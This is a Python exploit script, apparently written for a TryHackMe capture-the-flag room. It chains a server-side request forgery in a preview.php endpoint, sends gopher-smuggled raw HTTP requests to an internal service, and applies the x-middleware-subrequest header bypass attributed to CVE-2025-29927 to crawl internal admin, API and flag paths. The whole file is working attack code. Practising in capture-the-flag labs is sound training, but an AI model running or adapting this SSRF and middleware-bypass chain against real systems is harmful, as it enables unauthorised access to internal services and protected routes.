import re
import urllib.parse
import requests
from collections import deque

BASE = "http://10.82.159.192/preview.php?url="

# CVE-2025-29927 header candidates (version-dependent)
HEADER_CANDIDATES = [
    "middleware",
    "src/middleware",
    "pages/_middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

# Seed paths that often contain first-stage data/creds/flag hints
SEED_PATHS = [
    "/",
    "/customapi",
    "/admin",
    "/dashboard",
    "/login",
    "/api",
    "/api/admin",
    "/api/flag",
    "/flag",
    "/flag1",
    "/first-flag",
    "/secret",
    "/internal",
    "/debug",
    "/management",
]

# Hard limits so the script stays stable
MAX_PATHS = 150
TIMEOUT = 12


def build_preview_url(raw_http_request: str, host="127.0.0.1", port=10000) -> str:
    gopher_url = f"gopher://{host}:{port}/_" + urllib.parse.quote(raw_http_request, safe="")
    return BASE + urllib.parse.quote(gopher_url, safe="")


def send_gopher_get(path: str, x_middleware_subrequest: str):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: 127.0.0.1\r\n"
        f"x-middleware-subrequest: {x_middleware_subrequest}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    url = build_preview_url(req)
    r = requests.get(url, timeout=TIMEOUT)
    return r.text


def find_flag(text: str):
    m = re.search(r"THM\{[^}]+\}", text)
    return m.group(0) if m else None


def extract_paths(http_blob: str):
    # Extract basic href/src/action-like paths from entire raw response
    out = set()
    for p in re.findall(r"(?:href|src|action)=['\"](/[^'\"?#\s]{1,120})", http_blob, flags=re.I):
        out.add(p)
    # Extract JSON-ish absolute path strings
    for p in re.findall(r"['\"](/(?:api|admin|dashboard|management|customapi|flag|secret|internal|auth)[^'\"\s]{0,120})['\"]", http_blob, flags=re.I):
        out.add(p)
    return sorted(out)


def status_line(http_blob: str):
    m = re.search(r"HTTP/1\.[01]\s+(\d{3})", http_blob)
    return m.group(1) if m else "???"


def looks_useful(http_blob: str):
    code = status_line(http_blob)
    if code in {"200", "301", "302", "401", "403"}:
        return True
    if "Set-Cookie:" in http_blob or "Location:" in http_blob:
        return True
    return False


def main():
    seen = set()
    queue = deque(SEED_PATHS)

    print("[+] Starting first flag hunt on internal 127.0.0.1:10000 via preview.php SSRF")

    while queue and len(seen) < MAX_PATHS:
        path = queue.popleft()
        if not path.startswith("/"):
            continue
        if path in seen:
            continue
        seen.add(path)

        for header_val in HEADER_CANDIDATES:
            try:
                body = send_gopher_get(path, header_val)
            except Exception as e:
                print(f"[ERR] {path} header={header_val}: {e}")
                continue

            flag = find_flag(body)
            code = status_line(body)
            print(f"[{code}] {path} | hdr={header_val} | {len(body)}b")

            if flag:
                print("\n[FLAG FOUND]", flag)
                print("[PATH]", path)
                print("[HEADER]", header_val)
                return

            # On potentially interesting responses, learn more routes dynamically
            if looks_useful(body):
                for new_path in extract_paths(body):
                    if new_path not in seen and new_path not in queue and len(seen) + len(queue) < MAX_PATHS:
                        queue.append(new_path)

    print("\n[-] No THM flag found in current search space.")
    print("    Next step: manually inspect responses with 200/302 for credentials or chained endpoints.")


if __name__ == "__main__":
    main()
